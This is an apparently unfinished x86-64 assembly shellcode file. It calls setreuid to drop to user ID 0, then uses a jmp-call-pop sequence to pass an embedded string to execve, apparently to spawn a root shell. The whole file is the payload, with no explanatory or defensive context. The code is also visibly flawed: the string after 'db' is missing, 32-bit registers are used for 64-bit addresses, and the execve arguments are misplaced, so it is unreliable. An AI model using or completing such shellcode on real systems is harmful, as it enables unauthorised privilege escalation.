section .text
  global _start

_start:

    xor eax, eax
    mov al, 113     ; setreuid: Sets real and effective user IDs of the calling process. (Use to set privilege)
    xor edi, edi
    xor esi, esi
    syscall
    
    jmp short ender
    
    starter:
    xor eax, eax
    pop rbx         ; get the address of string

    mov [ebx+0x7], al    ; put a NULL at the position of N
    mov [ebx+0x8], ebx   ; put the address of the string at the position of AAAA
    mov [ebx+0xc], eax   ; put NULL*4 at the position of BBBB

    mov al, 59
    lea edi, [ebx+0x8]
    lea esi, [ebx+0xc]
    syscall    

  ender:
    call starter
    db
